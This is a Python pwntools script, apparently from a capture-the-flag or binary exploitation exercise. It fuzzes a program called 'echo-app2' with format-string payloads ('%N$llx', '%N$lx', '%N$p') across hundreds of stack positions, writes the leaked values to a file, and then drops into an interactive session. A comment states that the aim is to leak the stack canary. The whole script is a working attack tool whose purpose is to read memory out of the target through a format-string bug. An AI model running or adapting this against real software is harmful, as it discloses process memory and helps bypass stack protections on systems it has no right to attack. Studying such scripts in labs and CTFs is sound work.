#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("echo-app2")

# This is to prevent pwntools from cluttering the output
# with 'started process, stopped process' etc.
context.log_level = 'error'

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions

io = start()
with open("fuzz.txt", "ab") as file:
    for i in range(1,500):
        # %llx will print the whole canary where %p might not get it all
        if args.LLX:
            if i % 5 == 0:
                payload = f"%{i-4}$llx,%{i-3}$llx,%{i-2}$llx,%{i-1}$llx,%{i}$llx".encode()
                io.sendline(payload)
                print(f"%{i-4}$llx,%{i-3}$llx,%{i-2}$llx,%{i-1}$llx,%{i}$llx")
                recv = io.recv(timeout=1)
                print(recv)
                file.write(recv)
                file.write(b"\n")
                print("\n")

        if args.LX:
            if i % 5 == 0:
                payload = f"%{i-4}$lx,%{i-3}$lx,%{i-2}$lx,%{i-1}$lx,%{i}$lx".encode()
                io.sendline(payload)
                print(f"%{i-4}$lx,%{i-3}$lx,%{i-2}$lx,%{i-1}$lx,%{i}$lx")
                recv = io.recv(timeout=1)
                print(recv)
                file.write(recv)
                file.write(b"\n")
                print("\n")
        if args.P:
            if i % 5 == 0:
                payload = f"%{i-4}$p,%{i-3}$p,%{i-2}$p,%{i-1}$p,%{i}$p".encode()
                io.sendline(payload)
                print(f"%{i-4}$p,%{i-3}$p,%{i-2}$p,%{i-1}$p,%{i}$p")
                recv = io.recv(timeout=1)
                file.write(recv)
                file.write(b"\n")
                print(recv)
                print("\n")

file.close()

io.interactive()
